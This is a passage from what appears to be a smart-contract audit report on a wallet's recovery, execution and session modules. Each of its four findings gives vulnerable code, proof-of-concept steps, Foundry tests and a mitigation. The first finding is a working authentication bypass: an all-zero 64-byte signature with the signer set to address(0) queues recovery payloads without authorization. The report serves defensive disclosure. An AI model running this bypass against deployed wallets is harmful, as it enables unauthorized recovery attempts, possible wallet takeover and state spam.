## Derived From Pattern/Invariant
queuePayload auth bypass when _signer is zero due to ecrecover(…) == address(0) acceptance

## Exploit Type
AuthByPass

## Location
Recovery.queuePayload

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
Recovery.queuePayload relies on isValidSignature to authenticate the guardian. In the ECDSA (EIP‑2098) branch, invalid signatures commonly yield address(0) from ecrecover (e.g., r=0, s=0, v=27). The code then checks addr == _signer and returns true without guarding against zero, so passing _signer == address(0) makes any invalid 64‑byte signature succeed. Vulnerable snippet:

function isValidSignature(...) internal view returns (bool) {
  bytes32 rPayloadHash = recoveryPayloadHash(_wallet, _payload);
  if (_signature.length == 64) {
    (r, s, v,) = _signature.readRSVCompact(0);
    address addr = ecrecover(rPayloadHash, v, r, s);
    if (addr == _signer) {
      return true; // addr can be address(0) for invalid signatures
    }
  }
  ...
}

function queuePayload(...) external {
  if (!isValidSignature(_wallet, _signer, _payload, _signature)) revert InvalidSignature(...);
  // accepts _signer == address(0) with invalid 64-byte signatures
}

Impact:
- Unauthorized queueing: Any EOA can queue arbitrary payloads for signer = 0x0 on any wallet.
- If a wallet’s recovery tree ever includes a recovery leaf with signer = address(0), this becomes a full auth bypass to queue and, after the required delay, complete a recovery → potential wallet takeover.
- Even without such a leaf, enables unbounded spam/bloat of the zero‑signer queue.

## Impact
Unauthorized queue writes for signer=address(0) across wallets; in misconfigured wallets (zero‑signer leaf), attacker can satisfy recovery preconditions and take control after timelock; otherwise DoS/storage bloat of zero-signer queues.

## Proof of Concept
1) Attacker crafts any 64-byte EIP-2098 signature with r=0, s=0 (v implied as 27), so ecrecover(...) returns address(0).
2) Calls queuePayload(_wallet, _signer=address(0), _payload, fakeSig) – passes isValidSignature due to addr == _signer.
3) Payload is queued without any valid guardian authorization.
4a) If the wallet’s recovery tree contains a recovery leaf with signer=address(0), after the requiredDeltaTime the attacker can produce a matching branch and complete recovery to seize control.
4b) If not, attacker can still spam unlimited queued payload hashes under signer=0, bloating state.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Recovery} from "src/extensions/recovery/Recovery.sol";
import {Payload} from "src/modules/Payload.sol";

contract RecoveryQueueBypassTest is Test {
    Recovery rec;
    address attacker = address(0xBEEF);
    address wallet = address(0xA11CE);

    function setUp() public {
        rec = new Recovery();
        vm.warp(1_000_000);
    }

    function test_AuthBypass_QueueZeroSigner() public {
        // Build a simple payload (message kind)
        Payload.Decoded memory p = Payload.fromMessage(bytes("hello"));
        // 64-byte compact signature with r=0, s=0 -> ecrecover(...) == address(0)
        bytes memory fakeSig = new bytes(64);

        vm.prank(attacker);
        rec.queuePayload(wallet, address(0), p, fakeSig);

        // Assert unauthorized queue succeeded
        assertEq(rec.totalQueuedPayloads(wallet, address(0)), 1);
        bytes32 expected = Payload.hashFor(p, wallet);
        assertEq(rec.queuedPayloadHashes(wallet, address(0), 0), expected);
    }
}


## Suggested Mitigation
- In isValidSignature, treat zero-address recoveries as invalid:
  if (addr != address(0) && addr == _signer) return true; else continue;
- Additionally, defensively reject _signer == address(0) in queuePayload unless explicitly intended and safely handled across the recovery tree.
- Consider enforcing non-zero ECDSA signer addresses globally in recovery flows, and/or forbid zero-address leaves in the recovery configuration (sapient inner tree) at encode-time.





 **Derived From** : For any call with delegateCall == true, call.value must be 0; otherwise ETH is not forwarded and value is silently ignored.

## [L-6]. delegateCall silently ignores per-call value in Stage1Module.execute causing ETH/accounting mismatch

## Derived From Pattern/Invariant
For any call with delegateCall == true, call.value must be 0; otherwise ETH is not forwarded and value is silently ignored.

## Exploit Type
AccountingInvariantViolation

## Location
Stage1Module.execute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
RequiresRole

## Description
In Calls._execute (used by Stage1Module.execute), when a subcall is flagged as delegateCall, the engine performs a delegatecall to the extension selector and never forwards ETH. The per-call value field is ignored and there is no revert or warning. This breaks the balance/accounting invariant for integrators that assume a non-zero value in the payload will be transferred. Vulnerable snippet:

if (call.delegateCall) {
  (success) = LibOptim.delegatecall(
    call.to,
    gasLimit == 0 ? gasleft() : gasLimit,
    abi.encodeWithSelector(
      IDelegatedExtension.handleSequenceDelegateCall.selector,
      _opHash,
      _startingGas,
      i,
      numCalls,
      _decoded.space,
      call.data
    )
  );
} else {
  (success) = LibOptim.call(call.to, call.value, gas, call.data);
}

As shown, value is only used on the non-delegatecall path. An attacker or careless integrator can craft a payload with delegateCall=true and value>0; execution succeeds, wallet balance remains unchanged, and no ETH is transferred. This can lead to silent mis-accounting, stuck workflows, or downstream assumptions of funds being sent when they were not.

## Impact
Because delegatecall cannot transfer ETH, any non‑zero call.value in a delegate-call is silently ignored. This does not enable an external attacker to steal funds (only authorized signers can execute payloads), but it can lead to integration mistakes where off-chain systems assume ETH was forwarded when it was not. The effect is limited to functional/accounting confusion; no on-chain assets are at risk.

## Proof of Concept
1) Deploy a wallet-like harness that runs the same delegatecall/code path as Calls._execute.
2) Fund the harness with ETH.
3) Prepare a single-call payload: delegateCall=true, value=1 wei, target a no-op delegated extension.
4) Execute. The transaction succeeds, but the harness balance remains unchanged (1 wei never left). No revert or error is emitted, violating the balance/accounting expectation.
5) Compare with a non-delegatecall payload: value is forwarded and balance decreases.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {LibOptim} from "src/utils/LibOptim.sol";
import {Payload} from "src/modules/Payload.sol";
import {IDelegatedExtension} from "src/modules/interfaces/IDelegatedExtension.sol";

contract NoopExt is IDelegatedExtension {
  // Match interface; just succeed and return empty bytes
  function handleSequenceDelegateCall(
    bytes32,
    uint256,
    uint256,
    uint256,
    uint256,
    bytes calldata
  ) external returns (bytes memory) {
    return "";
  }
}

contract CallsHarness {
  // Minimal harness replicating Calls._execute delegateCall vs call behavior
  function run(Payload.Call[] memory calls, uint256 space) external payable {
    bytes32 opHash = bytes32(uint256(0x01));
    uint256 startingGas = gasleft();
    uint256 numCalls = calls.length;
    for (uint256 i = 0; i < numCalls; i++) {
      Payload.Call memory c = calls[i];
      uint256 gasLimit = c.gasLimit;
      bool success;
      if (c.delegateCall) {
        success = LibOptim.delegatecall(
          c.to,
          gasLimit == 0 ? gasleft() : gasLimit,
          abi.encodeWithSelector(
            IDelegatedExtension.handleSequenceDelegateCall.selector,
            opHash,
            startingGas,
            i,
            numCalls,
            space,
            c.data
          )
        );
      } else {
        success = LibOptim.call(
          c.to,
          c.value,
          gasLimit == 0 ? gasleft() : gasLimit,
          c.data
        );
      }
      require(success, "subcall failed");
    }
  }

  function getBalance() external view returns (uint256) {
    return address(this).balance;
  }

  receive() external payable {}
}

contract Receiver { receive() external payable {} }

contract DelegateValueIgnoredTest is Test {
  CallsHarness wallet;
  NoopExt ext;
  address attacker = address(0xA11CE);

  function setUp() public {
    wallet = new CallsHarness();
    ext = new NoopExt();
    vm.deal(address(wallet), 10 ether);
    vm.deal(attacker, 1 ether);
  }

  function testDelegateCallValueIgnored() public {
    uint256 beforeBal = address(wallet).balance;

    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: address(ext),
      value: 1 wei,              // value is set but will be ignored on delegatecall
      data: hex"",
      gasLimit: 0,
      delegateCall: true,
      onlyFallback: false,
      behaviorOnError: 0         // IGNORE
    });

    vm.prank(attacker);
    wallet.run{value: 0}(calls, 0);

    uint256 afterBal = address(wallet).balance;
    assertEq(afterBal, beforeBal, "wallet balance must be unchanged; value was ignored during delegatecall");
  }

  function testNonDelegateCallForwardsValue() public {
    uint256 beforeBal = address(wallet).balance;
    Receiver r = new Receiver();

    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: address(r),
      value: 1 wei,              // forwarded when not using delegatecall
      data: hex"",
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: 0
    });

    vm.prank(attacker);
    wallet.run{value: 0}(calls, 0);

    assertEq(address(r).balance, 1, "receiver should have received 1 wei");
    assertEq(address(wallet).balance, beforeBal - 1, "wallet should have sent 1 wei");
  }
}


## Suggested Mitigation
Enforce an explicit invariant: if call.delegateCall == true then require(call.value == 0) and revert otherwise. Example: insert before performing the delegatecall: if (call.delegateCall && call.value != 0) revert("DELEGATECALL_WITH_VALUE_NOT_SUPPORTED"); Additionally, document this constraint in the payload format and/or normalize the encoder to zero out value in delegateCall calls.





 **Derived From** : If _signature consists of exactly one FLAG_BRANCH item whose inner bytes decode to (nVerified = true, nRoot), then the returned root should equal nRoot

## [M-7]. Branch-first folding in Recovery._recoverBranch corrupts root (keccak256(0||nRoot)) causing false negatives for valid recovery signatures

## Derived From Pattern/Invariant
If _signature consists of exactly one FLAG_BRANCH item whose inner bytes decode to (nVerified = true, nRoot), then the returned root should equal nRoot

## Exploit Type
ArrayLimits

## Location
Recovery.recoverSapientSignatureCompact

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
Permissionless

## Description
In Recovery._recoverBranch, the FLAG_BRANCH case unconditionally folds the current root with the nested branch root using root = LibOptim.fkeccak256(root, nroot). Unlike FLAG_RECOVERY_LEAF and FLAG_NODE (which set root = node if root == 0), the branch path does not special-case the first element. When the first (or only) item in a signature is a branch, this computes keccak256(0x00..00 || nRoot) instead of nRoot, drifting the Merkle root and invalidating otherwise-correct proofs. Vulnerable snippet:

if (flag == FLAG_BRANCH) {
  (size, rindex) = _signature.readUint24(rindex);
  uint256 nrindex = rindex + size;
  (bool nverified, bytes32 nroot) = _recoverBranch(_wallet, _payloadHash, _signature[rindex:nrindex]);
  rindex = nrindex;
  verified = verified || nverified;
  root = LibOptim.fkeccak256(root, nroot); // BUG: no first-item special-case
  continue;
}

## Impact
Functional DoS: Valid recovery signatures that begin with a single branch return a mismatched image root and are rejected. This can block time-locked recovery flows and any sapient-compact proofs relying on branch-first encodings.

## Proof of Concept
1) Queue a payload for a signer to satisfy the recovery leaf timelock (requiredDeltaTime = 0, minTimestamp = 0). 2) Build a recovery sapient compact signature whose only item is a FLAG_BRANCH wrapping a single FLAG_RECOVERY_LEAF for that signer. 3) Call recoverSapientSignatureCompact with this signature and the queued payload hash. 4) Observe that it returns keccak256(0x00..00 || nRoot) instead of nRoot, while the same sub-branch provided without the outer branch returns nRoot. 5) This root drift causes valid proofs to be rejected upstream.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Recovery} from "src/extensions/recovery/Recovery.sol";
import {Payload} from "src/modules/Payload.sol";
import {LibOptim} from "src/utils/LibOptim.sol";

contract RecoveryBranchFirstInvariantTest is Test {
  Recovery rec;

  function setUp() public {
    rec = new Recovery();
  }

  function _toEIP2098(uint8 v, bytes32 r, bytes32 s) internal pure returns (bytes memory sig) {
    uint8 y = (v == 27) ? 0 : 1;
    uint256 sU = uint256(s);
    if (y == 1) {
      sU |= (1 << 255);
    } else {
      sU &= ((1 << 255) - 1);
    }
    sig = abi.encodePacked(r, bytes32(sU));
  }

  function test_BranchFirstRootDriftFalseNegative() public {
    // Wallet and signer
    address wallet = address(0xBEEFCAFE);
    uint256 sk = 0xA11CE;
    address signer = vm.addr(sk);

    // Build a simple message payload
    bytes memory msgData = bytes("hello");
    Payload.Decoded memory p = Payload.fromMessage(msgData);

    // Digest used by Recovery's time-lock map and by sapient compact
    bytes32 digest = Payload.hashFor(p, wallet);

    // Sign the recovery-domain hash to queue the payload
    bytes32 rHash = rec.recoveryPayloadHash(wallet, p);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, rHash);
    bytes memory sig64 = _toEIP2098(v, r, s);

    // Queue payload (sets timestampForQueuedPayload[wallet][signer][digest])
    rec.queuePayload(wallet, signer, p, sig64);

    // Build inner sub-branch: single recovery leaf
    // FLAG_RECOVERY_LEAF = 1, requiredDeltaTime=0 (3 bytes), minTimestamp=0 (8 bytes)
    bytes memory inner = bytes.concat(
      bytes1(uint8(1)),               // FLAG_RECOVERY_LEAF
      bytes20(signer),                // signer
      bytes1(0x00), bytes1(0x00), bytes1(0x00), // uint24 requiredDeltaTime
      bytes8(uint64(0))               // uint64 minTimestamp
    );

    // Build outer branch that just wraps the inner leaf
    // FLAG_BRANCH = 4, followed by uint24 size and then inner bytes
    bytes memory size3 = bytes.concat(
      bytes1(uint8(inner.length >> 16)),
      bytes1(uint8(inner.length >> 8)),
      bytes1(uint8(inner.length))
    );
    bytes memory outer = bytes.concat(bytes1(uint8(4)), size3, inner);

    // Recover roots
    vm.prank(wallet);
    bytes32 rootInner = rec.recoverSapientSignatureCompact(digest, inner);

    vm.prank(wallet);
    bytes32 rootBranchFirst = rec.recoverSapientSignatureCompact(digest, outer);

    // Bug manifests as rootBranchFirst == keccak256(0 || rootInner) instead of rootInner
    assertEq(rootBranchFirst, LibOptim.fkeccak256(bytes32(0), rootInner));
  }
}


## Suggested Mitigation
In Recovery._recoverBranch, handle the first-element branch consistently with other item types: replace `root = LibOptim.fkeccak256(root, nroot);` with `root = (root != bytes32(0)) ? LibOptim.fkeccak256(root, nroot) : nroot;` so a branch at position 0 sets root = nroot.





 **Derived From** : For implicit sessions: attestation.authData.issuedAt <= block.timestamp

## [L-8]. Implicit sessions accept future-dated attestations (no recency bound) enabling time-warped approvals

## Derived From Pattern/Invariant
For implicit sessions: attestation.authData.issuedAt <= block.timestamp

## Exploit Type
TimestampDependentLogic

## Location
SessionManager.recoverSapientSignature

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
RequiresRole

## Description
SessionManager.recoverSapientSignature relies on _validateImplicitCall and SessionSig.recoverSignature to validate implicit calls. Neither enforces a time-recency check on attestation.authData.issuedAt. As long as the target contract returns the expected magic in acceptImplicitRequest, an attestation with issuedAt > block.timestamp is accepted. This violates the temporal invariant and lets an attacker present future-dated attestations to activate sessions prematurely, relying on targets that do not perform their own time checks.

Vulnerable flow:
- ImplicitSessionManager._validateImplicitCall: no check for issuedAt <= block.timestamp.
- SessionSig.recoverSignature: verifies identity signature but performs no recency validation.
- If target returns correct magic, the call is accepted.

Relevant snippet:
- ImplicitSessionManager._validateImplicitCall(...):
  bytes32 result = ISignalsImplicitMode(call.to).acceptImplicitRequest(wallet, attestation, call);
  bytes32 attestationMagic = attestation.generateImplicitRequestMagic(wallet);
  if (result != attestationMagic) revert SessionErrors.InvalidImplicitResult();
  // No check on attestation.authData.issuedAt


## Impact
No direct vulnerability in SessionManager. ImplicitSessionManager intentionally does not enforce time semantics on attestations; it passes the attestation to the target, which must decide validity (including any time windows). Accepting a future-dated issuedAt is only problematic if a target contract fails to validate time recency, which is an integrator bug outside this module. No direct asset risk attributable to SessionManager.

## Proof of Concept
1) Attacker obtains a valid identity-signed attestation for their EOA as approvedSigner with authData.issuedAt = block.timestamp + 1.
2) Attacker crafts a payload with an implicit call to a target that simply returns the magic value (no time checks).
3) Attacker signs the call (session signature) and submits to SessionManager.recoverSapientSignature as the wallet.
4) Function accepts the future-dated attestation and returns an imageHash without reverting, proving the invariant break.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {SessionManager} from "src/extensions/sessions/SessionManager.sol";
import {Payload} from "src/modules/Payload.sol";
import {ISignalsImplicitMode} from "src/extensions/sessions/implicit/ISignalsImplicitMode.sol";
import {Attestation, LibAttestation, AuthData} from "src/extensions/sessions/implicit/Attestation.sol";

contract MockImplicitTarget is ISignalsImplicitMode {
  function acceptImplicitRequest(
    address wallet,
    Attestation calldata att,
    Payload.Call calldata /*call*/
  ) external view returns (bytes32) {
    return LibAttestation.generateImplicitRequestMagic(att, wallet);
  }
}

contract SessionManagerTemporalTest is Test {
  SessionManager manager;
  MockImplicitTarget target;
  address wallet;
  uint256 identitySk;
  address identityAddr;
  uint256 sessionSk;
  address sessionAddr;

  // CALL_TYPEHASH from Payload.sol
  bytes32 constant CALL_TYPEHASH = 0x0603985259a953da1f65a522f589c17bd1d0117ec1d3abb7c0788aef251ef437;

  function setUp() public {
    manager = new SessionManager();
    target = new MockImplicitTarget();
    wallet = address(0xBEEFCAFE);
    identitySk = 0xA11CE;
    identityAddr = vm.addr(identitySk);
    sessionSk = 0xBEE5;
    sessionAddr = vm.addr(sessionSk);
  }

  function _bytes3(uint24 x) internal pure returns (bytes memory) { return abi.encodePacked(bytes3(x)); }

  function _packConfig(address identitySigner, bool includeEmptyBlacklist) internal pure returns (bytes memory) {
    bytes memory cfg;
    // Identity signer node: firstByte top-nibble 0x04 => 0x40, then address
    cfg = abi.encodePacked(cfg, bytes1(0x40), identitySigner);
    if (includeEmptyBlacklist) {
      // Blacklist node: top-nibble 0x03 => 0x30, low nibble = 0 (count=0)
      cfg = abi.encodePacked(cfg, bytes1(0x30));
      // No addresses follow
    }
    return abi.encodePacked(_bytes3(uint24(cfg.length)), cfg);
  }

  function _compressSig(uint8 v, bytes32 r, bytes32 s) internal pure returns (bytes memory) {
    uint256 yParity = uint256(v - 27);
    bytes32 yParityAndS = bytes32((uint256(s) & ((uint256(1) << 255) - 1)) | (yParity << 255));
    return abi.encodePacked(r, yParityAndS);
  }

  function _hashCall(Payload.Call memory c) internal pure returns (bytes32) {
    return keccak256(abi.encode(CALL_TYPEHASH, c.to, c.value, keccak256(c.data), c.gasLimit, c.delegateCall, c.onlyFallback, c.behaviorOnError));
  }

  function _callHashWithReplay(Payload.Decoded memory payload, uint256 idx) internal view returns (bytes32) {
    return keccak256(abi.encodePacked(payload.noChainId ? uint256(0) : block.chainid, payload.space, payload.nonce, idx, _hashCall(payload.calls[idx])));
  }

  function _buildEncodedSignature(
    Payload.Decoded memory payload,
    Attestation memory att
  ) internal view returns (bytes memory) {
    // 1) Session configuration: identity signer + empty blacklist
    bytes memory cfg = _packConfig(identityAddr, true);

    // 2) Attestation list (count=1): packed attestation + identity signature
    bytes memory attPack = LibAttestation.toPacked(att);
    bytes32 attHash = LibAttestation.toHash(att);
    (uint8 vId, bytes32 rId, bytes32 sId) = vm.sign(identitySk, attHash);
    bytes memory idSigCompact = _compressSig(vId, rId, sId);
    bytes memory attestSection = abi.encodePacked(bytes1(uint8(1)), attPack, idSigCompact);

    // 3) Call signatures: implicit flag byte 0x80 + session signature (compact)
    bytes memory callSigs;
    for (uint256 i = 0; i < payload.calls.length; i++) {
      bytes32 ch = _callHashWithReplay(payload, i);
      (uint8 vS, bytes32 rS, bytes32 sS) = vm.sign(sessionSk, ch);
      bytes memory sessSigCompact = _compressSig(vS, rS, sS);
      // isImplicit=1 (MSB), attestationIndex=0 => 0x80
      callSigs = abi.encodePacked(callSigs, bytes1(0x80), sessSigCompact);
    }

    return abi.encodePacked(cfg, attestSection, callSigs);
  }

  function test_FutureIssuedAt_Accepted() public {
    // Build payload with one implicit call
    Payload.Decoded memory payload;
    payload.kind = Payload.KIND_TRANSACTIONS;
    payload.noChainId = false;
    payload.space = 1;
    payload.nonce = 0;
    payload.calls = new Payload.Call[](1);
    payload.calls[0] = Payload.Call({
      to: address(target),
      value: 0,
      data: "",
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_IGNORE_ERROR
    });

    // Future-dated attestation
    Attestation memory att;
    att.approvedSigner = sessionAddr;
    att.identityType = 0x01020304;
    att.issuerHash = keccak256("issuer");
    att.audienceHash = keccak256("audience");
    att.applicationData = "";
    att.authData = AuthData({redirectUrl: "", issuedAt: uint64(block.timestamp + 60)});

    bytes memory encodedSignature = _buildEncodedSignature(payload, att);

    vm.prank(wallet);
    bytes32 imageHash = manager.recoverSapientSignature(payload, encodedSignature);
    // Should not revert; imageHash derived from config (non-zero)
    assertTrue(imageHash != bytes32(0));
  }
}


## Suggested Mitigation
Do not modify SessionManager. Instead, document clearly that targets implementing ISignalsImplicitMode must enforce their own temporal policy if needed. Example in targets: require(att.authData.issuedAt <= block.timestamp + ALLOWED_CLOCK_SKEW) and, if desired, require(block.timestamp - att.authData.issuedAt <= MAX_ATTESTATION_AGE) or include an explicit expiry in applicationData and validate it. Provide reference implementations/tests to guide integrators to perform these checks.



